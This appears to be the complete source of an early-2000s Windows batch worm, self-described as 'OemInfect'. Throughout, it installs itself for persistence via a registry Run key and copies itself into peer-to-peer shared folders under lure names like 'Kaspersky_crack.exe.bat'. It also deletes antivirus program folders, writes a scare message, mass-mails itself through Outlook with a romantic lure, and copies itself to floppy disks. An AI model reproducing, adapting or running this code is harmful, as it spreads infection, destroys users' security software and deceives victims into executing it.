   ctty nul
   echo off
   echo [general]>%windir%\system\oeminfo.ini
   echo Manufacturer=Not touch>>%windir%\system\oeminfo.ini
   echo Model=Explosive>>%windir%\system\oeminfo.ini
   echo
   echo [OEMSpecific]>>%windir%\system\oeminfo.ini
   echo "SubModel=<My Computer>" >>%windir%\system\oeminfo.ini
   echo "SerialNo=<0184>" >>%windir%\system\oeminfo.ini
   echo  "OEM1=<15.01.03>" >>%windir%\system\oeminfo.ini
   echo "OEM2=<Eintrag>" >>%windir%\system\oeminfo.ini
   echo [Support Information]>>%windir%\system\oeminfo.ini
   echo Line1=Danger!!>>%windir%\system\oeminfo.ini
   echo Line2=Your computer will be destroyed!!!! >>%windir%\system\oeminfo.ini
   echo Line3=The dangerous mistake in a consequence on your computer was found the very dangerous virus has got! >>%windir%\system\oeminfo.ini
   echo Line4=He format your winchester, spoils CMOS, burns the monitor and hypnosis your mind!!! >>%windir%\system\oeminfo.ini
   echo Line5=Never more starts your computer!!!!! >>%windir%\system\oeminfo.ini
   copy %0 C:\oem.bat >nul
   @attrib +h +s C:\oem.bat >nul
   md C:\HOTLove
   copy %0 c:\HOTLove\HOTLove.exe.bat >nul
   copy %0 c:\Little_Love.txt.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Love.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\Cool_sex.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\Game.exe.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\Game.exe.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Sex.exe.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\sp1.exe.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Game_Of_Love.exe.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\Kaspersky_crack.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\Cool_mp3.mp3.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\Porno.jpg.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Porn_photo.jpg.bat >nul
   copy %0 %windir%\LittleLove.txt.bat >nul
   echo REGEDIT4>C:\yos.reg
   echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>C:\yos.reg
   echo "oemexp"="C:\\oem.bat" >> C:\yos.reg
   regedit /s C:\yos.reg
   del C:\yos.reg >nul
   if exist C:\progra~1\norton~1\*.* deltree /y C:\progra~1\norton~1\*.*
   cls
   if exist C:\progra~1\norton~2\*.* deltree /y C:\progra~1\norton~2\*.*
   cls
   if exist C:\progra~1\trendm~1\*.* deltree /y C:\progra~1\trendm~1\*.*
   cls
   if exist C:\progra~1\zonela~1\*.* deltree /y C:\progra~1\zonela~1\*.*
   cls
   if exist C:\progra~1\kasper~1\kasper~1\*.* deltree /y C:\progra~1\kasper~1\kasper~1\*.*
   cls
   echo This is oeminfo joke. >>%windir%\info.txt
   echo Little worm/p2p virus. >>%windir%\info.txt
   echo Name "OemInfect" >>%windir%\info.txt
   echo By AlEkS >>%windir%\info.txt
   echo top100@mail.zp.ua >>%windir%\info.txt
   echo Ukraine >>%windir%\info.txt
   echo  21.01.2003 >>%windir%\info.txt
   if not exist %windir%\info.vbs goto 1
   if exist %windir%\info.vbs goto 2
   :1
   echo On Error Resume Next  >>%windir%\info.vbs
   echo Set out = Wscript.CreateObject("Outlook.Application")   >>%windir%\info.vbs
   echo Set mapi = out.GetNameSpace("MAPI")  >>%windir%\info.vbs
   echo For lists = 1 to mapi.AddressLists.Count  >>%windir%\info.vbs
   echo Set lists2 = mapi.AddressLists(lists)  >>%windir%\info.vbs
   echo x = 1   >>%windir%\info.vbs
   echo recips = lists2.AddressEntries(x)  >>%windir%\info.vbs
   echo next   >>%windir%\info.vbs
   echo Set email = out.CreateItem(0)  >>%windir%\info.vbs
   echo email.Recipients.Add(recips)  >>%windir%\info.vbs
   echo email.Subject = "Little love :)"   >>%windir%\info.vbs
   echo email.Body = "One kiss, you're the only one for me!"   >>%windir%\info.vbs
   echo email.Attachments.Add "%windir%\LittleLove.txt.bat"  >>%windir%\info.vbs
   echo email.DeleteAfterSubmit = True   >>%windir%\info.vbs
   echo email.Send   >>%windir%\info.vbs
   :2
   %windir%\info.vbs
   if not exist A:\ goto 3
   if exist A:\ goto 4
   :4
   copy %0 A:\News.txt.bat >nul
   :3
   ctty con
   cls
